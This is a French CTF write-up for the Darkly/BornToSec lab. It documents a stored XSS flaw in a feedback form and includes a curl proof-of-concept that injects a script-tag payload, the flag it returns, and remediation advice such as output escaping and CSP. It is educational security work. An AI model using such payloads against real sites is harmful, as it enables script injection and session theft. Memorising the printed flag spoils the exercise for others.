# Darkly — README : Vulnérabilité XSS stockée dans le formulaire de feedback

## Résumé
Ce document décrit une vulnérabilité de type **Cross-Site Scripting (XSS) stockée** présente sur la page `feedback` (`index.php?page=feedback`) de l’application BornToSec / Darkly.  
Les entrées utilisateur soumises via le formulaire sont réaffichées dans la page **sans échappement adéquat**, permettant l’injection et l’exécution de code JavaScript. Dans le contexte du CTF, cette faille permet de déclencher un comportement non prévu et d’obtenir une flag.

---

## Contexte
La page de feedback permet aux utilisateurs de soumettre un commentaire via un formulaire HTML. Les données envoyées en POST sont ensuite affichées dans la page.  
L’absence de filtrage et d’échappement côté serveur ouvre la porte à une injection XSS.

---

## Preuve de concept (PoC)

### Observation du formulaire
Le formulaire contient notamment :
- `txtName`
- `mtxtMessage`

Les données sont envoyées en POST à la même page (`feedback`).

### Payload d’exploitation
```bash
curl -s -X POST 'http://192.168.64.3/index.php?page=feedback'   --data-urlencode 'txtName=attacker'   --data-urlencode 'mtxtMessage=<script/onload=alert('"'"'XSS'"'"')>a'   -d 'btnSign=Sign+Guestbook'
```

### Résultat observé
La réponse HTML contient :
```html
<center>
  <h2 style="margin-top:50px;">
    The flag is : 0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e
  </h2>
</center>
```

Cela confirme que l’entrée utilisateur est interprétée comme du code HTML/JavaScript.

---

## Analyse technique de la faille

### Type de vulnérabilité
- **XSS stockée (Stored XSS)**

### Cause
- Les données utilisateur sont :
  1. acceptées sans validation suffisante,
  2. stockées ou réinjectées,
  3. affichées sans échappement dans le HTML.

Le navigateur interprète alors les balises injectées comme du code exécutable dans le contexte du site.

---

## Impact
- **Exécution de JavaScript arbitraire** dans le navigateur des utilisateurs.
- **Vol de cookies de session** ou d’informations sensibles.
- **Altération de l’interface utilisateur**.
- **Divulgation d’informations sensibles** (flag dans le cadre du CTF).

Sévérité estimée : **Élevée**.

---

## Remédiations recommandées

### 1. Échapper systématiquement les sorties HTML
```php
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
```
Cela empêche l’interprétation des caractères spéciaux (`<`, `>`, `"`, `'`).

### 2. Valider les entrées côté serveur
Refuser ou nettoyer les entrées contenant des balises HTML :
```php
if (preg_match('/<[^>]+>/', $mtxtMessage)) {
    die('Invalid input');
}
```

### 3. Utiliser un moteur de templates sécurisé
Les moteurs modernes (Twig, Blade, etc.) échappent les variables par défaut.

### 4. Mettre en place une Content Security Policy (CSP)
Exemple d’en-tête HTTP :
```http
Content-Security-Policy: default-src 'self'; script-src 'self'
```

### 5. Nettoyer et revalider les données
- Nettoyer avant stockage.
- Revalider systématiquement avant affichage.

---

## Détection et vérification
- **Avant correction :** Les payloads XSS sont exécutés.
- **Après correction :**
  - Les balises HTML sont affichées comme du texte.
  - Aucun script injecté ne s’exécute.
  - Aucune information sensible n’est révélée.

---

## Checklist de validation
- [ ] Échappement HTML appliqué à toutes les sorties utilisateur.
- [ ] Validation serveur des entrées.
- [ ] CSP active.
- [ ] Aucun JavaScript injecté ne s’exécute.

---

## Conclusion
Cette vulnérabilité illustre l’importance de **ne jamais faire confiance aux entrées utilisateur**.  
La prévention des XSS repose sur l’échappement systématique des sorties, une validation serveur stricte et des politiques de sécurité côté navigateur.

---

## Flag (CTF)
```
0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e
```
